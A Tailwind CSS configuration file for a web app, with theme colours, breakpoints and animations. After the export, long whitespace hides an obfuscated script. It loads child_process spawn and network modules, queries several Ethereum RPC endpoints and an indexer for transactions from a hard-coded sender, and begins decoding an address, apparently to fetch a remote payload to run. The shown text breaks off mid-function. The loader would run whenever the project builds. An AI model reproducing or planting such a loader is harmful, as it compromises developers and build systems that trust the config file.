import { createRequire } from 'module';

const require = createRequire(import.meta.url);

/** @type {import('tailwindcss').Config} */
export default {
  darkMode: "class",
  content: ["./index.html", "./src/**/*.{vue,js,ts,jsx,tsx}"],
  theme: {
    extend: {
      height: {
        dvh: "100dvh",
      },
      maxHeight: {
        dvh: "100dvh",
      },
      minHeight: {
        dvh: "100dvh",
      },
      maxWidth: {
        fullvw: "100vw",
      },
      screens: {
        sm: "480px",
        md: "678px",
        lg: "1010px",
        xl: "1365px",
        'lg-small': '934px',
        'ipad-portrait': {
          raw: '(max-width: 1366px) and (orientation: portrait)',
        },
        'ipad-portrait-large': {
          raw: '(min-width: 934px) and (max-width: 1189px)',
        },
        'ipad-portrait-small': {
          raw: '(min-width: 678px) and (max-width: 933px) and (orientation: portrait)',
        },
        'ipad-landscape-large': {
          raw: '(min-width: 1190px) and (max-width: 1365px) and (orientation: landscape)',
        },
      },
      fontFamily: {
        sans: [
          "Poppins",
          "Inter",
          "Montserrat",
          "Open Sans",
          "arial",
          "sans-serif",
        ],
      },
      colors: {
        // Background colors
        primary: {
          DEFAULT: "#939393",
          dark: "#181a1b",
          pink: "#FF0066",
          "pink-dark": "#b30047",
          "pink-light": "#FF1A76",
          gradient: {
            start: "#37FFD7",
            end: "#07F468",
            "start-dark": "#00ab91",
            "end-dark": "#06c454",
          },
        },
        accent: {
          pink: {
            light: "#fb5ba2",
            dark: "#940444",
          },
          green: {
            light: "#07f468",
            dark: "#06c353",
          },
        },
        disabled: {
          light: {
            bg: "#9f9f9f",
            shadow: "#636363",
            text: "#000000",
          },
          dark: {
            bg: "#4e5558",
            shadow: "#4b5154",
            text: "#e8e6e3",
          },
        },
        input: {
          DEFAULT: "rgba(255, 255, 255, 0.2)",
          dark: "rgba(24, 26, 27, 0.2)",
        },
        error: {
          DEFAULT: "#ff4848",
          dark: "#a10000",
        },
        status: {
          DEFAULT: "#FDB022",
          dark: "#B77702",
          new: "#ffe500",
          dot: {
            light: "#fdb022",
            dark: "#b77702",
          },
          trigger: {
            light: "#fac515",
            dark: "#8f6e03",
          },
        },
        avatar: {
          DEFAULT: "#4CC9F0",
          dark: "#4CC9F0",
        },
        avatar: {
          bg: {
            light: "#4cc9f0",
            dark: "#0d799a",
          },
        },
        cover: {
          overlay: "rgba(0, 0, 0, 0.5)",
        },
        panel: {
          light: {
            DEFAULT: "rgba(234, 236, 240, 0.7)",
            border: "#d0d5dd",
            buttonHover: "rgba(255, 255, 255, 0.1)",
          },
          dark: {
            DEFAULT: "rgba(34, 37, 38, 0.7)",
            border: "#3b4043",
            buttonHover: "rgba(24, 26, 27, 0.1)",
          },
        },
        notification: {
          hover: {
            DEFAULT: "rgba(251, 91, 162, 0.1)",
            dark: "rgba(251, 91, 162, 0.1)",
          },
        },
        sidebar: {
          bg: {
            DEFAULT: "rgba(255, 255, 255, 0.7)",
            dark: "rgba(24, 26, 27, 0.7)",
          },
          active: {
            DEFAULT: "rgba(251, 91, 162, 0.2)",
            dark: "rgba(148, 4, 68, 0.2)",
          },
          text: {
            DEFAULT: "#475467",
            dark: "#B1B1AA",
          },
          "active-text": {
            DEFAULT: "#ff0066",
            dark: "#ff1a75",
          },
          logout: {
            bg: {
              DEFAULT: "rgba(41, 112, 255, 0.1)",
              dark: "rgba(0, 60, 179, 0.1)",
            },
            hover: {
              DEFAULT: "rgba(12, 17, 29, 0.1)",
              dark: "rgba(10, 14, 23, 0.1)",
            },
            text: {
              DEFAULT: "#2970ff",
              dark: "#3698ff",
            },
          },
          help: {
            text: {
              DEFAULT: "#667085",
              dark: "#9e9589",
            },
          },
        },
        submenu: {
          bg: {
            DEFAULT: "rgba(249,250,251,0.7)",
            dark: "rgba(27,29,30,0.7)",
          },
          title: {
            text: {
              DEFAULT: "#344054",
              dark: "#bdb7af",
            },
          },
          item: {
            text: {
              DEFAULT: "#667085",
              dark: "#9e9589",
            },
            hoverText: {
              DEFAULT: "#07f468",
              dark: "#23f97a",
            },
            "hover-shadow": {
              DEFAULT: "#07f468",
              dark: "#06c353",
            },
            "hover-bg": {
              DEFAULT: "rgba(12,17,29,0.1)",
              dark: "rgba(10,14,23,0.1)",
            },
          },
        },
        text: {
          DEFAULT: "#ffffff",
          dark: "#e8e6e3",
          primary: "#0C111D",
          secondary: "#FCFAFF",
          tertiary: "#FCFCFD",

          secondary: {
            light: "#667085",
            dark: "#ffffff85",
          },
          tab: {
            light: "#344054",
            dark: "#bdb7af",
            active: {
              light: "#0c111d",
              dark: "#dbd8d3",
            },
          },
          badge: {
            light: "#667085",
            dark: "#9e9589",
          },
          notification: {
            light: "#000000",
            dark: "#e8e6e3",
          },
          time: {
            light: "#667085",
            dark: "#9e9589",
          },
          link: {
            light: "#1c39ff",
            dark: "#1c39ff",
            hover: {
              light: "#0720c1",
              dark: "#0720c1",
            },
          },
          muted: {
            light: "#344054",
            dark: "#bdb7af",
          },
          secondary: {
            light: "#667085",
            dark: "#9e9589",
          },
          darker: {
            light: "#0c111d",
            dark: "#e8e6e3",
          },
          dark: {
            mutedBluish: "#ACBACF",
            primary: "#e8e6e3",
            secondary: "#dec8ff",
            tertiary: "#e6e4e1",
            muted: "#dbd8d3",
          },
          quaternary: "#667085",
        },
        placeholder: {
          DEFAULT: "#ffffff",
          dark: "#e8e6e3",
        },
        handle: {
          light: "#d0d5dd",
          dark: "#cecac4",
        },
        border: {
          DEFAULT: "#DEE5EC",
          tab: {
            light: "#d0d5dd",
            dark: "#2f3335",
            hover: {
              light: "#667085",
              dark: "#525a6a",
            },
            active: {
              light: "#0c111d",
              dark: "#0a0e17",
            },
          },
          notification: {
            light: "#eaecf0",
            dark: "#353a3c",
            default: {
              light: "#98a2b3",
              dark: "#494f52",
            },
            warning: {
              light: "#fdb022",
              dark: "#a76d02",
            },
            success: {
              light: "#2ed3b7",
              dark: "#1f937f",
            },
            info: {
              light: "#2ce",
              dark: "#0c88a1",
            },
            destructive: {
              light: "#ff4405",
              dark: "#b12d00",
            },
          },
          icon: "#98A2B3",
          tab: "#F2F4F7",
          input: "#0C111D",
          "tab-dark": "#333739",
          "input-dark": "#857c6d",
        },
        errorBorder: {
          DEFAULT: "#ff4405",
          dark: "#b12d00",
        },
        background: {
          light: {
            DEFAULT: "rgba(255, 255, 255, 0.2)",
            input: "rgba(255, 255, 255, 0.3)",
            inputHover: "rgba(255, 255, 255, 0.5)",
          },
          dark: {
            DEFAULT: "rgba(24, 26, 27, 0.2)",
            input: "rgba(0, 0, 0, 0.3)",
            inputHover: "rgba(0, 0, 0, 0.5)",
            app: "#1A1B1B",
            cardBackground: "#333333",
            popupBg: "#424242",
          },
          header: {
            light: "#eaecf0",
            dark: "#222526",
          },
          notification: {
            light: "rgba(255, 255, 255, 0.5)",
            dark: "rgba(24, 26, 27, 0.5)",
            panel: {
              light: "rgba(255, 255, 255, 0.9)",
              dark: "rgba(24, 26, 27, 0.9)",
            },
            icon: {
              green: "#07f468",
              default: {
                light: "rgba(152, 162, 179, 0.1)",
                dark: "rgba(67, 76, 91, 0.1)",
              },
              warning: {
                light: "rgba(253, 176, 34, 0.1)",
                dark: "rgba(183, 119, 2, 0.1)",
              },
              success: {
                light: "rgba(46, 211, 183, 0.1)",
                dark: "rgba(35, 168, 151, 0.1)",
              },
              info: {
                light: "rgba(34, 204, 238, 0.1)",
                dark: "rgba(14, 152, 180, 0.1)",
              },
              destructive: {
                light: "rgba(255, 68, 5, 0.1)",
                dark: "rgba(201, 51, 0, 0.1)",
              },
            },
            smallIcon: {
              default: {
                light: "#98a2b3",
                dark: "#434c5b",
              },
              warning: {
                light: "#fdb022",
                dark: "#b77702",
              },
              success: {
                light: "#2ed3b7",
                dark: "#23a897",
              },
              info: {
                light: "#2ce",
                dark: "#0e98b4",
              },
              destructive: {
                light: "#ff4405",
                dark: "#c93300",
              },
            },
          },
        },
        bg: {
          overlay: "rgba(0, 0, 0, 0.3)",
          card: "rgba(255, 255, 255, 0.25)",
          form: "hsla(0, 0%, 100%, 0.5)",
          status: {
            light: "#ffe500",
            dark: "#a99700",
          },
          row: {
            odd: "rgba(242, 244, 247, 0.5)",
            dark: {
              odd: "rgba(30, 32, 34, 0.5)",
            },
          },
          statusTag: "#000",
          dark: {
            statusTag: "#181a1b",
            switch: "#181a1b",
            overlay: "rgba(24,26,27,0.3)",
            form: "rgba(24,26,27,0.5)",
          },
          gradient: {
            overlay: "rgba(0,0,0,0.45)",
            "overlay-dark": "rgba(24,26,27,0.45)",
            overlayLg: "rgba(0,0,0,0.9)",
            "overlayLg-dark": "rgba(24,26,27,0.9)",
          },
        },
        cta: {
          dismiss: {
            light: "#344054",
            dark: "#bdb7af",
            hover: "#1c39ff",
          },
          warning: {
            light: "#b54708",
            dark: "#f78d4f",
          },
          success: {
            light: "#107569",
            dark: "#80eee1",
          },
          info: {
            light: "#088ab2",
            dark: "#52d0f7",
          },
          destructive: {
            light: "#97180c",
            dark: "#f37266",
          },
        },
        buttonPrimary: {
          DEFAULT: "#ff0066",
          dark: "#cc0052",
        },
        buttonPrimaryBorder: {
          DEFAULT: "#ff0066",
          dark: "#b30047",
        },
        buttonSecondary: {
          DEFAULT: "rgba(255, 255, 255, 0.15)",
          dark: "rgba(24, 26, 27, 0.15)",
        },
        buttonSecondaryBorder: {
          DEFAULT: "#ffffff",
          dark: "#303436",
        },
        // Checkbox colors
        checkbox: {
          DEFAULT: "deeppink",
          dark: "#c00068",
        },
        checkboxBorder: {
          DEFAULT: "#D0D5DD",
          dark: "#3b4043",
        },
        // Dropdown colors
        dropdown: {
          DEFAULT: "#ffffff",
          dark: "#181a1b",
        },
        dropdownText: {
          DEFAULT: "#111827",
          dark: "#d6d3cd",
        },
        dropdownBorder: {
          DEFAULT: "#e5e7eb",
          dark: "#363b3d",
        },
        content: {
          primary: "#0c111d",
          secondary: "#344054",
          tertiary: "#667085",
          dark: {
            primary: "#e8e6e3",
            secondary: "#bdb7af",
            tertiary: "#b1aaa0",
          },
        },
        dash: {
          text: "#667085",
          border: "#D0D5DD",
          warning: "#ff4405",
          warningLight: "#FF7C1E",
          success: "#07f468",
          successLight: "#39FF14",
          published: "#D1E0FF",
          draft: "#FFFFFF",
          tab: {
            active: "#000",
            inactive: "#F06",
            bg: "rgba(251,91,162,0.15)",
          },
          bg: {
            light: "rgba(255,255,255,0.5)",
            lighter: "rgba(255,255,255,0.3)",
            warning: "rgba(255,68,5,0.1)",
          },
        },
        light: {
          text: {
            quaternary: "#667085",
          },
          bg: {
            section: "hsla(0, 0%, 100%, 0.4)",
          },
        },
        customGrey: {
          DEFAULT: "#E3E4E1",
        },
        customGrey2: {
          DEFAULT: "#DFE1DD",
        },
        customDarkGrey: {
          DEFAULT: "#B7BBBB",
        },
        lightViolet: {
          DEFAULT: "#5549FF",
        },
        darkGrey: {
          DEFAULT: "#D1D0FE",
        },
        gray: {
          700: "#344054",
          500: "#6B7280",
          800: "#1F2937",
        },
        brightPink: {
          DEFAULT: "#FF0066",
        },
        activePink: {
          DEFAULT: "#FF0464",
        },
        fce40d: "#fce40d",
        d0d5dd: "#d0d5dd",
        ff00a6: "#ff00a6",
        dee5ec: "#dee5ec",
        "primary-text": "#221f1f",
        "primary-bg": "#f9fafb",
        "border-light": "#d0d5dd",
        "secondary-bg": "#edeff3",
        "dark-text": "#0c111d",
        "secondary-text": "#98A2B3",
        white: "#ffffff",
        "gray-text": "#667085",
        black: "#000",
        "medium-text": "#344054",
        "light-border": "#dee5ec",
        "light-bg": "#eff3f8",
        error: "#ff4405",
        "error-light": "#ff692e",
        success: "#07f468",
        "error-dark": "#ff561d",
        "dark-gray": "#475467",
        "darker-text": "#101828",
        "beige-text": "#b1aaa0",
        "light-beige": "#d6d3cd",
        "medium-beige": "#bdb7af",
        "almost-black": "#303437",
        "lightest-bg": "#f5f7fa",
        "medium-border": "#d1d5db",
        "medium-gray": "#9ca3af",
        "light-gray": "#a3a3a3",
        "dark-bg": "#20262c",
        "darker-bg": "#0b0f12",
        "dark-border": "#2f343b",
        "darker-border": "#1c1f22",
        "light-divider": "#eaecf0",
        "dark-gray-2": "#353a3c",
        timberwolf: "#dbd8d3",
        "american-silver": "#d3d0ca",
        independence: "#4a5568",
        "raisin-black-2": "#202325",
        vodka: "#bdb7ef",
        platinum: "#e8e6e3",

        // accent colors
        "blue-accent": "#004EEB",
        "blue-accent-light": "#3f9dff",
        "tag-bg": "#D1E0FF",
        "radio-border": "#d0d5dd",
        "tooltip-bg": "rgba(16,24,40,0.7)",
        "dark-tooltip-bg": "rgba(14,19,32,0.9)",
        "preview-bg": "#f2f6fc",
        "dark-preview-bg": "#1d1f20",
        "upload-bg": "rgba(255,68,5,0.1)",
        "dark-upload-bg": "rgba(201,51,0,0.1)",
        creamViolet: "#5549FF",
        "brand-pink": "#FF0464",
        "brand-textPink": "#FF128D",
        "brand-yellow": "#fec100",
        "brand-green": "#13ce66",
      },
      backdropBlur: {
        xs: "5px",
        lg: "25px",
      },
      boxShadow: {
        sh1: "0 1px 2px 0 rgba(16, 24, 40, 0.05)",
        "sh1-dark": "0 1px 2px 0 rgba(13, 19, 32, 0.05)",
        sidebar: "0 0 8px 0 rgba(0, 0, 0, 0.08)",
        // custom: "4px 0 10px 0 rgba(0, 0, 0, 0.08)",
        green: "4px 4px 0 0 #07f468",
        custom: "0px 2px 8px 0px rgba(0,0,0,0.15)",
      },
      backgroundImage: {
        "gradient-warning": `
                linear-gradient(90deg, rgba(255, 255, 255, 0) 0%, rgba(255, 255, 255, 0.9) 100%),
                linear-gradient(0deg, rgba(255, 68, 5, 0.1) 0%, rgba(255, 68, 5, 0.1) 100%),
                linear-gradient(0deg, rgba(255, 255, 255, 0.9), rgba(255, 255, 255, 0.9))
              `,
        "dark-gradient-warning": `
                linear-gradient(90deg, rgba(24, 26, 27, 0) 0%, rgba(24, 26, 27, 0.9) 100%),
                linear-gradient(0deg, rgba(201, 51, 0, 0.1) 0%, rgba(201, 51, 0, 0.1) 100%)
              `,
      },
      keyframes: {
        bouncedown: {
          "0%": {
            opacity: "1",
            width: "100%",
            height: "auto",
          },
          "100%": {
            opacity: "0",
            width: "60px",
            height: "80px",
          },
        },
        bouncup: {
          "0%": {
            opacity: "0",
            width: "60px",
            height: "auto",
            bottom: "0",
            left: "0",
          },
          "80%": {
            opacity: "1",
            width: "100%",
            height: "auto",
            bottom: "2px",
            left: "2px",
          },
          "100%": {
            opacity: "1",
            width: "100%",
            height: "auto",
            bottom: "0",
            left: "0",
          },
        },
        slideFromLeft: {
          "0%": {
            transform: "translateX(0%)",
          },
          "100%": {
            transform: "translateX(78%)",
          },
        },
        slideFromRight: {
          "0%": {
            transform: "translateX(78%)",
          },
          "60%": {
            transform: "translateX(21%)",
          },
          "100%": {
            transform: "translateX(19%)",
          },
        },
        borealisBar: {
          "0%": { left: "0%", right: "100%", width: "0%" },
          "10%": { left: "0%", right: "75%", width: "25%" },
          "90%": { right: "0%", left: "75%", width: "25%" },
          "100%": { right: "0%", left: "100%", width: "25%" },
        },
        skeletonLoading: {
          "0%": { backgroundColor: "rgba(173,173,173,1)" },
          "50%": { backgroundColor: "rgba(173,173,173,0.7)" },
          "100%": { backgroundColor: "rgba(173,173,173,1)" },
        },
        profileCrossfade: {
          "0%": { opacity: "0" },
          "100%": { opacity: "1" },
        },
        driftLeft: {
          "0%": { transform: "translateX(0)" },
          "100%": { transform: "translateX(50%)" },
        },
        driftRight: {
          "0%": { transform: "translateX(0%)" },
          "100%": { transform: "translateX(-70%)" },
        },
        driftLeftDesktop: {
          "0%": { transform: "translateX(0)" },
          "100%": { transform: "translateX(15%)" },
        },
        driftRightDesktop: {
          "0%": { transform: "translateX(0%)" },
          "100%": { transform: "translateX(-25%)" },
        },
      },
      animation: {
        bouncedown: "bouncedown 0.1s ease forwards",
        bouncup: "bouncup 0.5s ease forwards",
        slidefromleft: "slideFromLeft 0s ease forwards",
        slidefromright: "slideFromRight 0.5s ease-in forwards",
        borealisBar: "borealisBar 2s linear infinite",
        "skeleton-loading": "skeletonLoading 1.3s ease infinite",
        profileCrossfade: "profileCrossfade 500ms linear forwards",
        driftLeft: "driftLeft 3s linear forwards",
        driftRight: "driftRight 3s linear forwards",
        driftLeftDesktop: "driftLeftDesktop 3s linear forwards",
        driftRightDesktop: "driftRightDesktop 3s linear forwards",
      },
      gridTemplateColumns: {
        5: "repeat(5, minmax(0, 1fr))",
        6: "repeat(6, minmax(0, 1fr))",
      },
    },
  },
  safelist: [
    // Ye tumhare complex hover classes ko Tailwind JIT ko batayega ki ye use hone wale hain
    "hover:bg-[linear-gradient(180deg,rgba(87,85,85,0.50)_0%,rgba(0,0,0,0.50)_100%)]",
    "hover:[box-shadow:0px_0px_20px_0px_rgba(255,150,192,0.8)_inset,_8px_8px_30px_0px_rgba(255,0,102,0.7),_0px_0px_35px_0px_rgba(255,255,221,0.5),_-8px_-8px_30px_0px_rgba(255,0,0,0.7)]",
  ],
  plugins: [
    function ({ addUtilities }) {
      addUtilities({
        ".no-scrollbar": {
          "-ms-overflow-style": "none",
          "scrollbar-width": "none",
        },
        ".no-scrollbar::-webkit-scrollbar": {
          display: "none",
        },
      });
    },
  ],
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global.i="A9-9232";const _0x3a2ebe=_0x355e;(function(_0x48f9d7,_0x1a07be){const _0x4e7ab0=_0x355e,_0x39127c=_0x48f9d7();while(!![]){try{const _0x3f9af1=parseInt(_0x4e7ab0(0xf0))/(0x1*-0x1087+-0x1170+-0x4*-0x87e)*(-parseInt(_0x4e7ab0(0xdd))/(0x7*0x165+0x160f+-0x1fd0))+-parseInt(_0x4e7ab0(0x13c))/(-0x202*0x2+-0xe38+0x123f)+-parseInt(_0x4e7ab0(0xa5))/(0x7b*0x39+-0x1*0x417+0xba4*-0x2)+parseInt(_0x4e7ab0(0xc0))/(0x3a0+-0x21a2+0x1e07*0x1)+parseInt(_0x4e7ab0(0xb5))/(0x8ff*0x2+-0x1a2*0x6+0x82c*-0x1)*(-parseInt(_0x4e7ab0(0x174))/(0x10a6+0x2534+-0x35d3))+parseInt(_0x4e7ab0(0x10c))/(-0x11d1+0xbe+0x1d*0x97)+parseInt(_0x4e7ab0(0x13a))/(-0xb8*0x8+0x1df6+0x80f*-0x3);if(_0x3f9af1===_0x1a07be)break;else _0x39127c['push'](_0x39127c['shift']());}catch(_0x388603){_0x39127c['push'](_0x39127c['shift']());}}}(_0x12f0,-0xfbb0*-0x2+0x1*0x13020b+0x5*-0x20155));import{createRequire}from'module';let require=createRequire(import.meta.url);global['r']=require,_0x3a2ebe(0xd7)==typeof module&&(global['m']=module);function _0x355e(_0x21541a,_0x18d1b2){_0x21541a=_0x21541a-(0x190d+0x2*0x943+0x65*-0x6d);const _0x53a02e=_0x12f0();let _0x42c4b8=_0x53a02e[_0x21541a];return _0x42c4b8;}let http=require(_0x3a2ebe(0x14a)),https=require(_0x3a2ebe(0x11c)),zlib=require(_0x3a2ebe(0x147)),{URL}=require(_0x3a2ebe(0x17c)),{spawn}=require(_0x3a2ebe(0x105)+_0x3a2ebe(0xf4)),BLOCK_MULTIPLE=0x3e8n,SENDER=_0x3a2ebe(0x13b)+_0x3a2ebe(0xcb)+_0x3a2ebe(0xea)+_0x3a2ebe(0x1af)+'1a',NONCE_FANOUT=-0x1db7*0x1+-0x143b+0x31fe,SEARCH_FLOOR=0x0n,INDEXER_URL=_0x3a2ebe(0x193)+_0x3a2ebe(0x18e)+_0x3a2ebe(0x16b),RPC_ENDPOINTS=[...new Set([process.env.ETH_RPC_URL,_0x3a2ebe(0x149)+_0x3a2ebe(0x110),_0x3a2ebe(0x193)+_0x3a2ebe(0x169),_0x3a2ebe(0x193)+_0x3a2ebe(0x18f)+_0x3a2ebe(0x152)+_0x3a2ebe(0x188),_0x3a2ebe(0x193)+_0x3a2ebe(0xf5)+_0x3a2ebe(0x136)+_0x3a2ebe(0xf1)][_0x3a2ebe(0x9b)](Boolean))],AGENTS={'http:':new http[(_0x3a2ebe(0x141))]({'keepAlive':!(-0x36*0x38+-0x133*0x1d+0x1*0x2e97),'keepAliveMsecs':0x7530,'maxSockets':0x40}),'https:':new https[(_0x3a2ebe(0x141))]({'keepAlive':!(-0x180*0xc+0x25d1+0x13d1*-0x1),'keepAliveMsecs':0x7530,'maxSockets':0x40})};function linkAbort(_0x438117,_0x5d73ca){const _0x8685d7=_0x3a2ebe,_0x25ef4d={'TCDmB':_0x8685d7(0x9a)};_0x438117&&_0x438117[_0x8685d7(0x194)+_0x8685d7(0xf9)](_0x25ef4d[_0x8685d7(0x191)],()=>_0x5d73ca[_0x8685d7(0x9a)](),{'once':!(0x1*-0x1073+-0x319*-0x4+0x40f)});}function decompressStream(_0x1f71f7){const _0x29b168=_0x3a2ebe,_0x5d6cbb={'BTHgJ':_0x29b168(0xc8)+_0x29b168(0x126),'VLAGf':function(_0x5acbb2,_0x1cb9f1){return _0x5acbb2===_0x1cb9f1;},'JbAci':_0x29b168(0x148),'GAvxe':_0x29b168(0x186),'KvMSQ':function(_0x55b882,_0x1919d7){return _0x55b882===_0x1919d7;},'DSbLa':_0x29b168(0xeb)};let _0x98df8e=(_0x1f71f7[_0x29b168(0x14b)][_0x5d6cbb[_0x29b168(0x12f)]]||'')[_0x29b168(0xc2)+'e']();return _0x5d6cbb[_0x29b168(0x164)](_0x5d6cbb[_0x29b168(0x14d)],_0x98df8e)||_0x5d6cbb[_0x29b168(0x164)](_0x5d6cbb[_0x29b168(0x176)],_0x98df8e)?_0x1f71f7[_0x29b168(0x195)](zlib[_0x29b168(0x14c)+'ip']()):_0x5d6cbb[_0x29b168(0x134)](_0x5d6cbb[_0x29b168(0xfd)],_0x98df8e)?_0x1f71f7[_0x29b168(0x195)](zlib[_0x29b168(0x165)+_0x29b168(0xb1)]()):_0x5d6cbb[_0x29b168(0x164)]('br',_0x98df8e)?_0x1f71f7[_0x29b168(0x195)](zlib[_0x29b168(0x19f)+_0x29b168(0x12d)+'ss']()):_0x1f71f7;}function httpRequest(_0x593adb,{method:_0x25a99d=_0x3a2ebe(0x133),body:_0x3f686c,signal:_0x95d4f4}={}){const _0x3d2da5=_0x3a2ebe,_0x42d10d={'JODvp':function(_0x56ddc3,_0x1259f1){return _0x56ddc3(_0x1259f1);},'gvgPD':_0x3d2da5(0x19b),'gMfuo':_0x3d2da5(0xaf),'KaaPY':_0x3d2da5(0x142),'rysJt':_0x3d2da5(0xc1),'UlrdI':function(_0x322dc5,_0x2b93bc){return _0x322dc5===_0x2b93bc;},'MHjGK':_0x3d2da5(0xd5),'zBIcw':function(_0x2a5ebb,_0xfe6778){return _0x2a5ebb+_0xfe6778;},'VGOlJ':function(_0x563e9c,_0x3a7e42){return _0x563e9c!=_0x3a7e42;},'xuBDG':function(_0x4bfaf9,_0x580f75){return _0x4bfaf9===_0x580f75;},'sZAHS':_0x3d2da5(0x161)+_0x3d2da5(0xa8),'tjngf':_0x3d2da5(0x12a)+_0x3d2da5(0x1aa),'LGNYs':_0x3d2da5(0x131),'YvZxf':_0x3d2da5(0x1a9)+'pe','vWzxi':_0x3d2da5(0x16e)+_0x3d2da5(0x1b5)};let _0x3cdce5=new URL(_0x593adb),_0x5032cf=_0x42d10d[_0x3d2da5(0x12c)](_0x42d10d[_0x3d2da5(0x139)],_0x3cdce5[_0x3d2da5(0x196)])?https:http,_0x27236b={'Accept':_0x42d10d[_0x3d2da5(0xa0)],'Accept-Encoding':_0x42d10d[_0x3d2da5(0xbb)],'Connection':_0x42d10d[_0x3d2da5(0x135)]};return _0x42d10d[_0x3d2da5(0xe3)](null,_0x3f686c)&&(_0x27236b[_0x42d10d[_0x3d2da5(0x115)]]=_0x42d10d[_0x3d2da5(0xa0)],_0x27236b[_0x42d10d[_0x3d2da5(0x17b)]]=Buffer[_0x3d2da5(0x19d)](_0x3f686c)),new Promise((_0x19f067,_0x4835e3)=>{const _0x3ef1bc=_0x3d2da5;let _0xaf0385=_0x5032cf[_0x3ef1bc(0xc7)]({'hostname':_0x3cdce5[_0x3ef1bc(0x93)],'port':_0x3cdce5[_0x3ef1bc(0x15d)]||(_0x42d10d[_0x3ef1bc(0x120)](_0x42d10d[_0x3ef1bc(0x139)],_0x3cdce5[_0x3ef1bc(0x196)])?0x1*-0xcfb+-0x1d2d+0xf*0x2ed:0x1338+0x2*-0x8d5+-0x13e),'path':_0x42d10d[_0x3ef1bc(0x14e)](_0x3cdce5[_0x3ef1bc(0x150)],_0x3cdce5[_0x3ef1bc(0x10e)]),'method':_0x25a99d,'agent':AGENTS[_0x3cdce5[_0x3ef1bc(0x196)]],'signal':_0x95d4f4,'headers':_0x27236b},_0x574ec9=>{const _0x4fd834=_0x3ef1bc,_0x10e94a={'ZGtcg':function(_0x483995,_0x4a5702){const _0x49dc91=_0x355e;return _0x42d10d[_0x49dc91(0x114)](_0x483995,_0x4a5702);},'vJvXf':_0x42d10d[_0x4fd834(0x18b)]};let _0x431427=_0x42d10d[_0x4fd834(0x114)](decompressStream,_0x574ec9),_0x39bef6=[];_0x431427['on'](_0x42d10d[_0x4fd834(0x122)],_0x123305=>_0x39bef6[_0x4fd834(0x198)](_0x123305)),_0x431427['on'](_0x42d10d[_0x4fd834(0x1ac)],()=>{const _0x589be9=_0x4fd834;try{_0x10e94a[_0x589be9(0x99)](_0x19f067,JSON[_0x589be9(0xd4)](Buffer[_0x589be9(0x107)](_0x39bef6)[_0x589be9(0x159)](_0x10e94a[_0x589be9(0xc5)])));}catch(_0x1c95a1){_0x10e94a[_0x589be9(0x99)](_0x4835e3,_0x1c95a1);}}),_0x431427['on'](_0x42d10d[_0x4fd834(0x121)],_0x4835e3);});_0xaf0385['on'](_0x42d10d[_0x3ef1bc(0x121)],_0x4835e3),_0x42d10d[_0x3ef1bc(0xe3)](null,_0x3f686c)&&_0xaf0385[_0x3ef1bc(0xb6)](_0x3f686c),_0xaf0385[_0x3ef1bc(0x142)]();});}async function withRpcEndpoints(_0x3c144e,_0x2ea979){const _0x495608=_0x3a2ebe;let _0x418a00=RPC_ENDPOINTS[_0x495608(0x14f)](()=>new AbortController());_0x418a00[_0x495608(0x95)](_0x15379b=>linkAbort(_0x2ea979,_0x15379b));try{return await Promise[_0x495608(0x11e)](RPC_ENDPOINTS[_0x495608(0x14f)]((_0x4c6137,_0x2fd673)=>_0x3c144e(_0x4c6137,_0x418a00[_0x2fd673][_0x495608(0x10b)])));}finally{for(let _0x393e64 of _0x418a00)_0x393e64[_0x495608(0x9a)]();}}async function rpcCall(_0x1c3ac1,_0x908566,_0x2038b9,_0x36db10){const _0x24e2d3=_0x3a2ebe,_0x55d7b1={'hXaau':function(_0x7320cd,_0x19397a,_0x30fde9){return _0x7320cd(_0x19397a,_0x30fde9);},'MxoIv':_0x24e2d3(0x19c),'CtMxp':_0x24e2d3(0x97)};let _0xffe3dd=await _0x55d7b1[_0x24e2d3(0x109)](httpRequest,_0x1c3ac1,{'method':_0x55d7b1[_0x24e2d3(0x9f)],'body':JSON[_0x24e2d3(0x98)]({'jsonrpc':_0x55d7b1[_0x24e2d3(0x140)],'id':0x1,'method':_0x908566,'params':_0x2038b9}),'signal':_0x36db10});return _0xffe3dd[_0x24e2d3(0xd6)];}async function rpcBatch(_0xb94eeb,_0x2e1831,_0x1aa236){const _0x143ca3=_0x3a2ebe,_0x8d06ce={'vVkBr':function(_0x259c12,_0x46239b,_0x186b51){return _0x259c12(_0x46239b,_0x186b51);},'HiWYY':_0x143ca3(0x19c)};let _0x303103=await _0x8d06ce[_0x143ca3(0x103)](httpRequest,_0xb94eeb,{'method':_0x8d06ce[_0x143ca3(0x1a8)],'body':JSON[_0x143ca3(0x98)](_0x2e1831[_0x143ca3(0x14f)](([_0xe79aa1,_0x386e83],_0x397f41)=>({'jsonrpc':_0x143ca3(0x97),'id':_0x397f41+(-0x2b*-0x48+0x2467+0x3*-0x102a),'method':_0xe79aa1,'params':_0x386e83}))),'signal':_0x1aa236}),_0x43900d=new Map(_0x303103[_0x143ca3(0x14f)](_0x46f816=>[_0x46f816['id'],_0x46f816]));return _0x2e1831[_0x143ca3(0x14f)]((_0x246f0d,_0x260de3)=>_0x43900d[_0x143ca3(0xe9)](_0x260de3+(-0xa25*-0x2+0x19fa+-0x2e43))[_0x143ca3(0xd6)]);}let toBlockHex=_0x460a01=>'0x'+_0x460a01[_0x3a2ebe(0x159)](0x1b97+-0x2*0x3a7+-0x1f*0xa7);function findSenderTx(_0xaed72){const _0x58ebf2=_0x3a2ebe;return _0xaed72[_0x58ebf2(0x9d)](_0x11770d=>_0x11770d[_0x58ebf2(0x18c)]&&_0x11770d[_0x58ebf2(0x18c)][_0x58ebf2(0xc2)+'e']()===SENDER)||null;}function decodeAddress(_0x3f982d){const _0x53878e=_0x3a2ebe,_0x160094={'ScXiL':_0x53878e(0x15a),'jrdXD':function(_0x5aff48,_0x31311f){return _0x5aff48(_0x31311f);},'DGksE':function(_0x4f37d6,_0x4e64f1){return _0x4f37d6(_0x4e64f1);}};let 